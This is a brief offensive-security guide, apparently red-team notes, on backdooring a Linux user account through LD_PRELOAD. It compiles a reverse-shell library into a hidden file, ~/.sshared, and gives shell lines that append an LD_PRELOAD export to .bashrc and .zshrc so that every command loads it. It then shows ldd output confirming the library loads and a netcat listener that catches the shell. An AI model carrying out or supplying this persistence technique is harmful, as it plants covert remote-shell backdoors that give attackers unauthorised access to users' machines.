# LD_PRELOAD

```
The dynamic linker can be run either indirectly by running some
dynamically linked program or shared object (in which case no
command-line options to the dynamic linker can be passed and, in
the ELF case, the dynamic linker which is stored in the .interp
section of the program is executed) or directly by running...

https://man7.org/linux/man-pages/man8/ld.so.8.html
```

The `LD_PRELOAD` directive can be used for linking an external library to a main program.
Declaring an `LD_PRELOAD` in `.bashrc` or `.zshrc` allows to let any binary, run by a user, to execute the code
contained in such shared object.

So first, compile `compile.c`, which opens a socket for a reverse shell, must be compiled using the following options:

`gcc -fPIC --shared compile.c -o ~/.sshared`

Let's assume it's saved under `~` home directory.

Then let's update both `.bashrc` and `.zshrc` with

```bash
[ -f "$HOME/.bashrc" ] && echo 'export LD_PRELOAD=$HOME/.sshared' >> "$HOME/.bashrc"
[ -f "$HOME/.zshrc" ] && echo 'export LD_PRELOAD=$HOME/.sshared' >> "$HOME/.zshrc"
```

From now on, opening a terminal and executing the program will run the shared library containing the backdoor.

Let's check the linkage after these steps:

`ldd /usr/bin/id`

```
 linux-vdso.so.1 (0x00007ffcb11e4000)
 /home/virgula/.sshared (0x0000727261bce000)
 libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x0000727261b88000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x0000727261992000)
 libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007272618f4000)
 /lib64/ld-linux-x86-64.so.2 (0x0000727261be3000)
```

Open a netcat to notice reverse shell connection attempt whenever a command is executed.

`nc -lvnp 1234`